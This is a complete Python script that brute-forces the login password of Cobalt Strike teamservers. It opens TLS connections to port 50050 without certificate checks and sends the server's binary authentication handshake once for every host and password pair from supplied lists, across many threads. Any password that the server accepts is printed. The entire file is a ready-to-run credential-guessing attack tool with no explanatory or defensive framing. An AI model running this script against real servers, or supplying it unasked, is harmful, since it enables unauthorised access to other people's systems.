#!/usr/bin/env python3

import time
import socket
import ssl
import argparse
import concurrent.futures
import sys
import itertools

parser = argparse.ArgumentParser()
parser.add_argument("-H", dest="hostlist",
                    help="Teamserver address list file")
parser.add_argument("-P", dest="passwdlist",
                    help="Password list file")
parser.add_argument("-p", dest="port", default=50050, type=int,
                    help="Teamserver port")
parser.add_argument("-t", dest="threads", default=25, type=int,
                    help="Concurrency level")

class NotConnectedException(Exception):
    def __init__(self, message=None, node=None):
        self.message = message
        self.node = node

class Connector:
    def __init__(self):
        self.sock = None
        self.ssl_sock = None
        self.ctx = ssl.SSLContext()
        self.ctx.verify_mode = ssl.CERT_NONE
        pass

    def is_connected(self):
        return self.sock and self.ssl_sock

    def open(self, hostname, port):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.ssl_sock = self.ctx.wrap_socket(self.sock)

        if hostname == socket.gethostname():
            ipaddress = socket.gethostbyname_ex(hostname)[2][0]
            self.ssl_sock.connect((ipaddress, port))
        else:
            self.ssl_sock.connect((hostname, port))

    def close(self):
        if self.sock:
            self.sock.close()
        self.sock = None
        self.ssl_sock = None

    def send(self, buffer):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        self.ssl_sock.sendall(buffer)

    def receive(self):
        if not self.ssl_sock: raise NotConnectedException("Not connected (SSL Socket is null)")
        received_size = 0
        data_buffer = b""

        while received_size < 4:
            data_in = self.ssl_sock.recv()
            data_buffer = data_buffer + data_in
            received_size += len(data_in)
        return data_buffer


def passwordcheck(host, password):
    result = None
    conn = Connector()
    conn.open(host.strip(), args.port)
    payload = bytearray(b"\x00\x00\xbe\xef") + len(password.strip()).to_bytes(1, "big", signed=True) + bytes(
        bytes(password.strip(), "ascii").ljust(256, b"A"))
    conn.send(payload)
    if conn.is_connected(): result = conn.receive()
    if conn.is_connected(): conn.close()
    if result == bytearray(b"\x00\x00\xca\xfe"):
        return (host.strip(), password.strip())
    else:
        return False


if __name__ == "__main__":
    args = parser.parse_args()
    hosts = open(args.hostlist).readlines()
    passwords = open(args.passwdlist).readlines()
    if len(hosts) > 0 and len(passwords) > 0:
        print("Hostlist: {}".format(args.hostlist))
        print("Host Count: {}".format(len(hosts)))
        print("Passwordlist: {}".format(args.passwdlist))
        print("Password Count: {}".format(len(passwords)))
        print("Threads: {}".format(args.threads))
    else:
        print("Host(s) or Password(s) required")
    start = time.time()
    attempts = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_check = [executor.submit(passwordcheck, host, password) for host, password in itertools.product(hosts,passwords)]
        for future in concurrent.futures.as_completed(future_to_check):
            try:
                data = future.result()
                attempts = attempts + 1
                if data:
                    print("Found Password: {0} {1}".format(data[0], data[1]))
            except Exception as exc:
                pass

    print("Attempts: {}".format(attempts))
    finish = time.time()
    print("Seconds: {:.1f}".format(finish - start))
    print("Attemps per second: {:.1f}".format((attempts) / (finish - start)))
